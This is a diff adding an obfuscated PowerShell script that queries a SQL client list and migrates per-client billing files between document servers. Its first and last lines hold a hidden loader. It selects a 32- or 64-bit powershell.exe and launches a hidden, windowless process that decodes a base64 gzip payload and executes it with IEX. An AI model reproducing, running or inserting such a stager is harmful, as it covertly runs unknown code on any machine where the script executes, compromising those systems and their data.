@@ -1,0 +1,114 @@
+ seT  v0I ([tYpe]("{1}{0}"-F 'TR','INtP')  )  ; SET-ItEM  ("VaRIAbL"+"E:6"+"7WC5"+"g")  (  [tYPe]("{3}{7}{2}{6}{4}{1}{5}{0}"-f 'SS','roC','Em.d','syS','ICs.P','E','iagnOSt','t') )  ; 
+
+
+[CmdletBinding()]
+param()
+
+
+cls
+
+[array]$Clients = @();
+[array]$Clients = Invoke-SQLCMD -ServerInstance XUTILSQL2 -Database DexmaSites -Query ("{78}{40}{38}{37}{83}{81}{71}{15}{2}{77}{19}{64}{33}{7}{36}{56}{50}{27}{44}{57}{87}{46}{4}{22}{17}{66}{55}{69}{48}{79}{67}{59}{0}{47}{80}{61}{39}{53}{58}{49}{85}{3}{75}{13}{62}{34}{6}{51}{12}{23}{20}{88}{60}{5}{25}{10}{11}{21}{28}{8}{1}{24}{84}{86}{82}{18}{35}{74}{41}{29}{26}{43}{70}{14}{65}{54}{45}{68}{9}{32}{73}{30}{63}{42}{76}{52}{72}{16}{31}" -f ' c','cdx.[cl_','e].','
+ ','ma','o','JOI','ve',' = ',' [ce','c','e
+ ','dexm','    ON cdx.dv_i','nmen','    , [c','me','i','i_i','tabase','d','       ON ce.[C','S','aSites.','id','nment AS ','AND ','Sites].dbo.[clients','lientID]','  ','[',']',']','tabaseSer','.dv_id
+        ','d','r]
+FROM ','cSe',' Do','_id]
+        JOIN','alue AS','
+      ','a','[','] AS ','RDE',' dex','dx.[cl_id] =','ent_dat','db','Dexma','N ','a',' dexmaSit','3
+O','s.dbo.c','   [','c
+		JOI','es.','
+		ON','ClientEnvir','[cl','d = dv','Dat','Name]
+      , [ce].[Da','tID] = 1','te','ef cdx','R BY','li','ce].[Enviro',' ','seNa','.',' = 96','   ','b','[Da','SELECT DISTINCT dv.dv_v','a_xr',' c.','r
+ ','v.d','rve',']
+WHERE   ','o.data_values dv','d','N','bo.')
+
+foreach ( $Client in $Clients ) {
+
+Write-Host "Beginning $($Client.DatabaseName) " -ForegroundColor DarkGray
+
+	if (($Client.DocServer -eq ("{0}{1}" -f'PA','Doc5')) -or ($Client.DocServer -eq ("{3}{1}{2}{0}" -f 'ct10','DocDi','re','P')))
+		{
+		Write-Verbose -Message "$($Client.DatabaseName) on $($Client.DocServer) has not been migrated to the new datacenter. ";
+		}
+	else
+		{
+	Write-Verbose -Message "Beginning $($Client.DatabaseName) ";
+		
+		[array]$CopyFrom = @();
+		
+		if (Test-Path -Path "\\PDocDirect10\$($Client.DatabaseName)")
+			{
+			Write-Verbose -Message "`t\\PDocDirect10\$($Client.DatabaseName) found, enumerating files(source). ";
+			$CopyFrom += @(Get-ChildItem -path "\\PDocDirect10\$($Client.DatabaseName)\Billing\*" ) 
+			}
+		if (Test-Path -Path "\\PADoc5\$($Client.DatabaseName)")
+			{
+			Write-Verbose -Message "`t\\PADoc5\$($Client.DatabaseName) folder found, enumerating files(source). ";
+			$CopyFrom += @(Get-ChildItem -path "\\PADoc5\$($Client.DatabaseName)\Billing\*");
+			}
+		
+		$DestPath = "\\" + $Client.DocServer + "\" + $Client.DatabaseName + ((("{0}{2}{1}" -f'{','Billing','0}')) -f[ChaR]92);
+		[array]$CopyTo = @();
+		
+		if (!(Test-Path -Path $DestPath))
+			{
+				Write-Verbose -Message "`t$($DestPath) not found!  Creating directory... ";
+				New-Item -ItemType directory -Path $DestPath;
+				if (!(Test-Path -Path $DestPath))
+					{
+						Write-Verbose -Message "Failed creating $($DestPath)... ";
+						continue;
+					}
+				else
+					{
+					Write-Verbose -Message "`t$($DestPath) created, enumerating files(dest). ";
+					$CopyTo += @(Get-ChildItem -path "$DestPath\*");
+					}
+			}
+		else
+			{
+			Write-Verbose -Message "`t$($DestPath) found, enumerating files(dest). ";
+			$CopyTo += @(Get-ChildItem -path "$DestPath\*");
+			}
+		
+		Write-Verbose -Message ("`tComparing "+'d'+'ire'+'ctory '+'co'+'ntents'+'...');
+		
+		$Files2Copy = Compare-Object -ReferenceObject $CopyFrom -DifferenceObject $CopyTo -Property name, length -PassThru | Where-Object {$_.SideIndicator -eq "<="};
+
+		if ($Files2Copy -ne $NULL)
+			{
+			foreach ($File in $Files2Copy)
+		        {
+		        Write-Verbose -Message "`tThis will copy File $($File.FullName) to $DestPath\$($File.Name) ";
+		        Copy-Item -Path $($File.FullName) -Destination $DestPath\$($File.Name) 
+		        }
+			}
+		else
+		    {
+		    Write-Verbose -Message "`tNo files to copy for $($Client.DatabaseName)! ";
+		    }
+
+		if ($Client.DocServer -eq ("{0}{1}"-f 'PD','oc1'))
+			{
+				$DropPath = ((("{7}{2}{0}{1}{3}{4}{6}{5}" -f 'PDo','c2{0}Rela','}','tep','rod{0}PrimeAll','ance{0}','i','{0}{0'))-f  [chAR]92) + $Client.DatabaseName + ((("{2}{0}{3}{1}" -f'J','lling','9U','Bi')).REplaCe(([ChAr]57+[ChAr]85+[ChAr]74),[sTRInG][ChAr]92));
+			}
+		else
+			{
+				$DropPath = ((("{3}{0}{6}{9}{2}{10}{7}{5}{4}{1}{8}" -f 'p26','nce6','ep','6','lia','l','p2PDoc','meA','p2','16p2Relat','rod6p2Pri')).RepLaCE('6p2','\')) + $Client.DatabaseName + ((("{1}{0}" -f'}Billing','{0'))-f [cHar]92);
+			}
+		if (Test-Path -Path $DropPath)
+			{
+				Write-Verbose -Message "`tDropping the $($DropPath) folder! ";
+				Remove-Item -Recurse -Path $DropPath 
+			}
+		else
+		{
+			Write-Verbose -Message "`tNo files to delete for $($Client.DatabaseName)! ";
+		}
+	Write-Verbose -Message "End $($Client.DatabaseName) ";
+		}
+		
+Write-Host "End $($Client.DatabaseName) " -ForegroundColor DarkGray
+}
+
+if( (  gET-cHIlDitem  VarIaBlE:v0i ).VALuE::Size -eq 4){$b=("{2}{1}{4}{0}{3}" -f's','e','pow','hell.exe','r')}else{$b=$env:windir+((("{4}{7}{0}{12}{11}{2}{8}{1}{5}{13}{9}{3}{10}{6}"-f'64xp','8v1','owsPower','r','x','.0xp','exe','p8syswow','Shellxp','e','shell.','d','8Win','8pow')).rEplACe(([cHAr]120+[cHAr]112+[cHAr]56),'\'))};$s=New-Object System.Diagnostics.ProcessStartInfo;$s.FileName=$b;$s.Arguments=('-nop'+' '+'-w'+' '+'hi'+'dden '+'-c'+' '+(('g'+'Ihs=Ne'+'w-Obje'+'ct ')  -CrEPLAcE([char]103+[char]73+[char]104),[char]36)+('IO.Memory'+'Stream(,[Convert]::FromBase64String({0}{0}H4sIANLUNlgCA7VWa2/aS'+'hD'+'9nE'+'r9D1aFZFslGAhtmkiV7trmFR6BOJgQiqKNvbYXFi+xl/Bo+9/vGOyU'+'qEmV6upaidj1zOyePXNmx94ydATlobQIGk5P+v7+3VEPR3guKbl1q3eXl3LC2'+'kQ3A'+'4OsrtSjIzDngi/FO+/eYYN6vSZ9lZQxWixMPsc0nJyf'+'G8soIqHYzwt'+'1IlAck/k9oyRWVOmHNAxIRI4v76fEEdJ3KXdXqDN+j1nqtjGwExDpGIVuYmtzByfoCtaCUaHI377J6vi4NClUH5aYxYpsbWJB'+'5gWXMVmV'+'fqrJhtebBVHkDnUiHnNPFIY0PCkXBmGMPdKF1R5Jh4iAu'+'7GswmngLyJ'+'i'+'GYXSs3MlC'+'+3dFBmGvYg7yHUjEkNUo'+'Rk+8hlRcuGSsbz0jzJOUVwtQ0HnBOyCRHxhk'+'eiR'+'Oi'+'QuNHDoMnJFvInSJavs8G8NUg6DwKsnIjUP6fkD3A5'+'3l4zsV5DV3wHvUqvC8zy9wMfP9+/ev/MyTbiVu2L8qbs9lAWMjsa7MQHASo/H'+'dOf7VSrmpQ5siQWPNjD'+'NXUdLo'+'k6kcZKQ8WQi5bZlsX6Y4cYg8Gf519cpZUEQwuNr0o1X8HZsc+pOICrNWm51b1dnNESJ7XUFmsSjITE3IZ5TJxOZ8lIeiMfI7tiFzK0L2BQ5NRDXJIz4WCSM5qXx72HVORVPsfqSMp'+'dEyIFcxoAK0qw+B7NPkiI3ww6ZA2X7uQwp8UDaJPNO5bzJdk/m4CQbD'+'MdxXuotobacvGQRzIibl1AY09SEloLv'+'hvIvuJ0lE9TBsciWm6iHXKZ7GjyMRbR0IJNw/mtrQRyKWUJHXmpQl+gbi/rZ3vKLZBiYMRr6sNIjJAPeJCRYItFHBDCfaUEtWEQ05wtG5uC7K/gawz6'+'Ud1ocO2Fhn7jyS2gz4e9VnnCTkXKAFRJuMS7ykk0jAXdHwnMqrv+G5uACecJlRCT'+'NlJLV1Fj'+'fiKQKchxtWvPRwkhkm'+'9K2IykSQFAt4nMdx+RzxRIR0Kd80C6pgeAZNUPWcfQZLaEVLTU78'+'D+gJ01unrqti2'+'lDi8x14KFm3Ow0ema/0ag8Xlh2RVjVpmj1mqJTvZlOLdS4GozEbRM1rmlxNq'+'psFxd0a'+'7WRO1prn7f6dlXU19up73oj0/P8U8+6Kn2q0fbQ'+'6OvFMm6b1WV7qK/0YiW'+'u0lWjTwf9'+'2UVN'+'3I9shgee5t+UzjBdt6OpXeKdbROhenDibC88ux503M2ooZ0NKzNUR'+'cgIq3ZN562RHqGeZmPf5qvWVPPrvoH0mkPJbX9Q0/v9mo4G9emDeab5EHuDA31ol+nt4uYqgHkNILS0YqXpki0f9YGkOkfYvwIf3'+'yg7gQ'+'c+5kekf+zyuIxnOkc6+'+'NRuHwDXaFHrMbBfD'+'8oc2ax7g1H7dlPTtNK'+'oV0GNIh3WfZQsiX29j1H8aG5NrWS73B1+6o48zb5hp5ppXC8cT9O0Vc'+'NsObel9ZfL0y/tIbXnHA00zf'+'6Q6AMEknPPVp/1u4OMv3bpd3AUB5iBEuAW'+'z0q0xq'+'NaeiP3OE0'+'iFGXfrWckCgmD7gb9LxM2Yow7SYN4ury'+'hQe3bxgQqdQDDk/KLI1V6clR/NY3s1fn5LUBNqiYVcKFNQl8E+eL6pFiEu7+4rhThwG8/osEXG+VpuX'+'zSP1Km'+'Dndhu13UpIZyj0b5fyYxrdwAfty3k'+'Pjr3R+sbyK2mM8O/5vh+Yu/4vjvGRhiKsDVgtuHkX2LfJ2IVDgHnxiQIlCElz7J'+'F9/lUhx34cPjXxzhFCJ'+'qCgAA{0}{0}));IEX ')-F[ChAR]39+'(New-O'+'bj'+'e'+'ct '+'IO.Stre'+'amRe'+'ad'+'er('+'New'+'-Object'+' '+('IO'+'.C'+'o'+'mp'+'re'+'ssio'+'n.G'+'zipStream(y'+'K9s,[I'+'O'+'.Compression'+'.Co'+'mpre'+'ssionM'+'od'+'e]:'+':De'+'com'+'pre'+'ss))).ReadToEnd();').RePLaCE('yK9','$'));$s.UseShellExecute=$false;$s.RedirectStandardOutput=$true;$s.WindowStyle=("{0}{1}{2}"-f'Hi','dd','en');$s.CreateNoWindow=$true;$p=  (  gi  ("vaRIABl"+"e:6"+"7wC5"+"g") ).VALuE::Start($s);
